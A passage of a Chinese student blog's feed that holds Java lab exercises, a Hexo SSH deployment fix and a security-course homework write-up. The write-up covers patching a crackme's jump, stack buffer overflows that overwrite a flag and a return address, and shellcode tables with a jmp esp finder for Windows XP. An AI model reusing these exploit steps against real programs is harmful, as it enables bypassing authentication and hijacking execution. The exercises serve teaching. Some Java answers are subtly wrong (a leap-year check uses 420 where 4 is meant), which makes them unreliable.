class="number">12</span>:System.out.println(<span class="string">"December"</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:System.out.println(<span class="string">"非法字符"</span>);<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/26/QSrJPg.png" alt="QSrJPg.png"></p><h3 id="问题3、"><a href="#问题3、" class="headerlink" title="问题3、"></a>问题3、</h3><p>打印图案：一个由n行星花组成的三角形。如n=5时的图案为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw2;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">three</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Scanner s=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">System.out.println(<span class="string">"请输入行数"</span>);</span><br><span class="line">n=s.nextInt();</span><br><span class="line"><span class="keyword">int</span> x,y,z;</span><br><span class="line"><span class="keyword">for</span>(x=<span class="number">1</span>;x&lt;=n;x++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(y=<span class="number">1</span>;y&lt;=n-x;y++)</span><br><span class="line">&#123;</span><br><span class="line">System.out.print(<span class="string">" "</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(z=<span class="number">1</span>;z&lt;=x;z++)</span><br><span class="line">&#123;</span><br><span class="line">System.out.print(<span class="string">"* "</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/26/QSrrIU.png" alt="QSrrIU.png"></p><h3 id="问题4、"><a href="#问题4、" class="headerlink" title="问题4、"></a>问题4、</h3><p>打印出所有的“水仙花数”。所谓“水仙花数”是指一个三位数，其各位数字的立方和等于该数本身。例如153是一个“水仙花数”，因为153=13+53+33。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw2;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">four</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//Scanner s=new Scanner(System.in);</span></span><br><span class="line">System.out.println(<span class="string">"水仙花数为："</span>);</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">for</span>(x=<span class="number">100</span>;x&lt;=<span class="number">999</span>;x++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">double</span> sum;</span><br><span class="line">sum=Math.pow(x/<span class="number">100</span>,<span class="number">3</span>)+Math.pow((x%<span class="number">100</span>)/<span class="number">10</span>,<span class="number">3</span>)+Math.pow(x%<span class="number">10</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(sum==x)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(x);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/26/QSrveP.png" alt="QSrveP.png"></p><h3 id="问题5、"><a href="#问题5、" class="headerlink" title="问题5、"></a>问题5、</h3><p>编写一个程序，从键盘读一个年份的数字，然后判断该年是否是闰年，如果是就输出“闰年”，如果不是就输出“非闰年”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw2;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">five</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">panduan</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x%<span class="number">400</span>==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">if</span>(x%<span class="number">420</span>==<span class="number">0</span>&amp;&amp;x%<span class="number">100</span>!=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Scanner s=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">System.out.println(<span class="string">"请输入年份"</span>);</span><br><span class="line"><span class="keyword">int</span> year;</span><br><span class="line">year=s.nextInt();</span><br><span class="line"><span class="keyword">if</span>(panduan(year))</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(year+<span class="string">"年 是闰年"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(year+<span class="string">"年 是非闰年"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/26/QSskyn.png" alt="QSskyn.png"></p><h3 id="问题6、"><a href="#问题6、" class="headerlink" title="问题6、"></a>问题6、</h3><p>统计个位数是6，并且能被3整除的五位数共有多少个。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">six</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(x=<span class="number">10000</span>;x&lt;=<span class="number">99999</span>;x++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(x%<span class="number">10</span>==<span class="number">6</span>&amp;&amp;x%<span class="number">3</span>==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">sum++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">"个位数是6，并且能被3整除的五位数共有"</span>+sum+<span class="string">"个"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/26/QSsKW4.png" alt="QSsKW4.png"></p><h3 id="问题7、"><a href="#问题7、" class="headerlink" title="问题7、"></a>问题7、</h3><p>编写一个程序，在其中建立一个有10个整数的数组，运行后从键盘输入10个数，然后输出其中的最小数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw2;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">seven</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Scanner s=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">System.out.println(<span class="string">"请输入10个数"</span>);</span><br><span class="line"><span class="keyword">int</span> a[]=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i]=s.nextInt();</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(a);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">System.out.print(a[i]+<span class="string">"\t"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/26/QSsB6A.png" alt="QSsB6A.png"></p><h3 id="问题8、"><a href="#问题8、" class="headerlink" title="问题8、"></a>问题8、</h3><p>编写一个程序，在其中定义一个6´6的二维整型数组, 利用随机函数产生36个10~20之间的随机整数放入，然后将数组输出到屏幕上(6行6列格式)。最后计算出数组中对角线元素的平方根和。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw2;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">erweishuzu</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[][]=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">6</span>][<span class="number">6</span>];</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">6</span>;j++)</span><br><span class="line">&#123;</span><br><span class="line">a[i][j]=(<span class="keyword">int</span>)(<span class="number">10</span>+Math.random()*<span class="number">10</span>);</span><br><span class="line">System.out.print(a[i][j]+<span class="string">" "</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">double</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> l;</span><br><span class="line"><span class="keyword">for</span>(l=<span class="number">0</span>;l&lt;<span class="number">6</span>;l++)</span><br><span class="line">&#123;</span><br><span class="line">sum=sum+Math.sqrt(a[l][l])+Math.sqrt(a[<span class="number">5</span>-l][l]);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">"平方根和为："</span>+sum);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/26/QS6Qq1.png" alt="QS6Qq1.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;java实验二。&lt;/p&gt;
    
    </summary>
    
    
      <category term="java" scheme="https://1187100546.github.io/categories/java/"/>
    
    
      <category term="java" scheme="https://1187100546.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>hexo发生error：spawn failed错误的解决方法</title>
    <link href="https://1187100546.github.io/2019/11/24/spawn-failed/"/>
    <id>https://1187100546.github.io/2019/11/24/spawn-failed/</id>
    <published>2019-11-24T10:54:46.000Z</published>
    <updated>2019-11-24T11:09:25.981Z</updated>
    
    <content type="html"><![CDATA[<p>hexo突然上传不了，出错了。</p><a id="more"></a><p>今天hexo突然部署不了文章了，错误页面如下。</p><p><img src="https://s2.ax1x.com/2019/11/24/MO2Q8s.png" alt="MO2Q8s.png"></p><p>然后就去github仓库看了一下，发下之前的ssh key没了，重新设了一个也连接不上。最后找到一个方法。</p><p>在存放key的目录下新建config文件。</p><p><img src="https://s2.ax1x.com/2019/11/24/MO22Ie.png" alt="MO22Ie.png"></p><p>填入以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User 你GitHub的邮箱</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure><p>然后用 <code>ssh -T git@github.com</code>命令测试能否连接</p><p>如果没有出现ssh不能连接的话，忽略以上内容</p><p>接着回到博客的根目录</p><p>第一种方法：</p><p>删除.deploy_git文件</p><p>然后输入<code>git config --gloabl core.autocrlf false</code></p><p>重新hexo clean</p><p>hexo g</p><p>hexo d</p><p>部署</p><p>但是发现好像只是一次性的。并不能永久解决</p><p>第二种方法：</p><p>打开_config.yml配置文件</p><p>修改以下内容</p><p>deploy:</p><p>type: git</p><p>repo: <a href="https://github.com/yourname/yourname.github.io.git" target="_blank" rel="noopener">https://github.com/yourname/yourname.github.io.git</a></p><p>branch: master</p><p>其中的repo修改为</p><p><a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:yourname/yourname.github.io.git</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hexo突然上传不了，出错了。&lt;/p&gt;
    
    </summary>
    
    
      <category term="记录" scheme="https://1187100546.github.io/categories/%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="记录" scheme="https://1187100546.github.io/tags/%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>网安作业3</title>
    <link href="https://1187100546.github.io/2019/11/19/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A3/"/>
    <id>https://1187100546.github.io/2019/11/19/%E7%BD%91%E5%AE%89%E4%BD%9C%E4%B8%9A3/</id>
    <published>2019-11-19T14:26:13.000Z</published>
    <updated>2019-11-24T07:31:43.119Z</updated>
    
    <content type="html"><![CDATA[<p>网安作业3.</p><a id="more"></a><h3 id="crackme"><a href="#crackme" class="headerlink" title="crackme:"></a>crackme:</h3><p>打开IDA找到判断跳转语句位置</p><p><img src="https://s1.ax1x.com/2019/11/19/MReyX4.png" alt="MReyX4.png"></p><p>修改跳转指令</p><p><img src="https://s1.ax1x.com/2019/11/19/MReocD.png" alt="MReocD.png"></p><p>应用到程序</p><p><img src="https://s1.ax1x.com/2019/11/19/MReOAI.png" alt="MReOAI.png"></p><p>运行结果：</p><p>正确密码显示错误，错误密码显示正确。</p><p><img src="https://s1.ax1x.com/2019/11/19/MRmkEn.png" alt="MRmkEn.png"></p><h3 id="overflow-1"><a href="#overflow-1" class="headerlink" title="overflow(1):"></a>overflow(1):</h3><p>首先输入7个q看一下栈情况</p><p><img src="https://s2.ax1x.com/2019/11/23/Mqgxu8.png" alt="Mqgxu8.png"></p><p>authenticated的值是1</p><p>输入8个q</p><p>没有执行前，authenticated的值还是1</p><p><img src="https://s2.ax1x.com/2019/11/23/Mq2JKK.png" alt="Mq2JKK.png"></p><p>执行以后，值被覆盖为0</p><p><img src="https://s2.ax1x.com/2019/11/23/Mq2UVe.png" alt="Mq2UVe.png"></p><h3 id="overflow-2"><a href="#overflow-2" class="headerlink" title="overflow(2):"></a>overflow(2):</h3><p>将跳转地址覆盖为验证通过的地址</p><p><img src="https://s2.ax1x.com/2019/11/23/Mq2qZF.png" alt="Mq2qZF.png"></p><p>用ultraedit编辑password文件，任意填充8字符覆盖password，4字符覆盖authenticated，4字符覆盖上一栈帧的ebp,填入4个字符返回地址。</p><p><img src="https://s2.ax1x.com/2019/11/23/MqRldg.png" alt="MqRldg.png"></p><p>再运行程序</p><p><img src="https://s2.ax1x.com/2019/11/23/MqRweU.png" alt="MqRweU.png"></p><h3 id="overflow-3"><a href="#overflow-3" class="headerlink" title="overflow(3):"></a>overflow(3):</h3><p>程序与2的区别是增加了头文件windows.h，buff由8字节变成44字节，有足够空间填入代码。</p><p>找到buff地址和返回地址</p><p><img src="https://s2.ax1x.com/2019/11/24/MLYJ5F.png" alt="MLYJ5F.png"></p><p>找到messageboxA入口地址</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*FuncPointer)</span><span class="params">(LPTSTR)</span></span>;  <span class="comment">// 函数指针  </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    FuncPointer GetAddr;</span><br><span class="line">    <span class="comment">// 加载成功后返回库模块的句柄 </span></span><br><span class="line">    LibHandle = LoadLibrary(<span class="string">"user32"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"user32 LibHandle = 0x%X\n"</span>, LibHandle);</span><br><span class="line">    <span class="comment">// 返回动态链接库(DLL)中的输出库函数地址</span></span><br><span class="line">    GetAddr=(FuncPointer)GetProcAddress(LibHandle,<span class="string">"MessageBoxA"</span>);   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"MessageBoxA = 0x%X\n"</span>, GetAddr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/24/MLt0zj.png" alt="MLt0zj.png"></p><p>构造password</p><table><thead><tr><th>机器码</th><th>汇编指令</th><th>解释</th></tr></thead><tbody><tr><td>33DB</td><td>XOR EBX,EBX</td><td>将EBX寄存器置为NULL</td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>686A6F6B65</td><td>PUSH 656b6f6a</td><td>Thisjoke</td></tr><tr><td>6854686973</td><td>PUSH 73696854</td><td></td></tr><tr><td>8BC4</td><td>MOV EAX,ESP</td><td>EAX里存入字符串指针</td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>50</td><td>PUSH EAX</td><td></td></tr><tr><td>50</td><td>PUSH EAX</td><td></td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>B8301D3148</td><td>MOV EAX,0x48311D30</td><td>调用MessageBoxA</td></tr><tr><td>FFD0</td><td>CALL EAX</td><td></td></tr></tbody></table><p><img src="https://s2.ax1x.com/2019/11/24/MLLowj.png" alt="MLLowj.png"></p><p>由于win10保护机制太强，没有办法显示messagebox</p><p>换到xp系统上实现</p><p>先找到messageboxA的入口地址</p><p><img src="https://s2.ax1x.com/2019/11/24/MLOene.png" alt="MLOene.png"></p><p>再找到buff起始地址</p><p><img src="https://s2.ax1x.com/2019/11/24/MLO8c8.png" alt="MLO8c8.png"></p><p><img src="https://s2.ax1x.com/2019/11/24/MLON7j.png" alt="MLON7j.png"></p><p><img src="https://s2.ax1x.com/2019/11/24/MLOsjU.png" alt="MLOsjU.png"></p><p>定位shellcode，找jmp esp指令</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_NAME <span class="meta-string">"user32.dll"</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    BYTE* ptr;</span><br><span class="line">    <span class="keyword">int</span> position,address;</span><br><span class="line">    HINSTANCE handle;</span><br><span class="line">    BOOL done_flag = FALSE;</span><br><span class="line">    handle=LoadLibrary(DLL_NAME);</span><br><span class="line">    <span class="keyword">if</span>(!handle)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" load dll erro !"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ptr = (BYTE*)handle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(position = <span class="number">0</span>; !done_flag; position++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ptr[position] == <span class="number">0xFF</span> &amp;&amp; ptr[position+<span class="number">1</span>] == <span class="number">0xE4</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//0xFFE4 is the opcode of jmp esp</span></span><br><span class="line">                <span class="keyword">int</span> address = (<span class="keyword">int</span>)ptr + position;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"OPCODE found at 0x%x\n"</span>,address);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(...)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> address = (<span class="keyword">int</span>)ptr + position;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"END OF 0x%x\n"</span>, address);</span><br><span class="line">            done_flag = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/24/MLzBOf.png" alt="MLzBOf.png"></p><p>定位exitprocess入口地址</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*FuncPointer)</span><span class="params">(LPTSTR)</span></span>;  <span class="comment">// 函数指针  </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    FuncPointer GetAddr;</span><br><span class="line">    <span class="comment">// 加载成功后返回库模块的句柄 </span></span><br><span class="line">    LibHandle = LoadLibrary(<span class="string">"kernel32"</span>);  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"kernel32 LibHandle = 0x%X\n"</span>, LibHandle);</span><br><span class="line">    <span class="comment">// 返回动态链接库(DLL)中的输出库函数地址</span></span><br><span class="line">    GetAddr=(FuncPointer)GetProcAddress(LibHandle,<span class="string">"ExitProcess"</span>);   </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ExitProcess = 0x%X\n"</span>, GetAddr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/24/MLzqh9.png" alt="MLzqh9.png"></p><p>修改password文件</p><table><thead><tr><th>机器码</th><th>汇编指令</th><th>解释</th></tr></thead><tbody><tr><td>33DB</td><td>XOR EBX,EBX</td><td>将EBX寄存器置为NULL</td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>686A6F6B65</td><td>PUSH 656b6f6a</td><td>Thisjoke</td></tr><tr><td>6854686973</td><td>PUSH 73696854</td><td></td></tr><tr><td>8BC4</td><td>MOV EAX,ESP</td><td>EAX里存入字符串指针</td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>50</td><td>PUSH EAX</td><td></td></tr><tr><td>50</td><td>PUSH EAX</td><td></td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>B8EA07D577</td><td>MOV EAX,0x77D507EA</td><td>调用MessageBoxA</td></tr><tr><td>FFD0</td><td>CALL EAX</td><td></td></tr><tr><td>53</td><td>PUSH EBX</td><td></td></tr><tr><td>B8A2BF817C</td><td>MOV EAX,0x7C81BFA2</td><td>调用exit（0）</td></tr><tr><td>FFD0</td><td>CALL EAX</td><td></td></tr></tbody></table><p><img src="https://s2.ax1x.com/2019/11/24/MOC6uq.png" alt="MOC6uq.png"></p><p>现在程序就可以正常退出</p><p><img src="https://s2.ax1x.com/2019/11/24/MOC58J.png" alt="MOC58J.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;网安作业3.&lt;/p&gt;
    
    </summary>
    
    
      <category term="作业" scheme="https://1187100546.github.io/categories/%E4%BD%9C%E4%B8%9A/"/>
    
    
      <category term="作业" scheme="https://1187100546.github.io/tags/%E4%BD%9C%E4%B8%9A/"/>
    
  </entry>
  
  <entry>
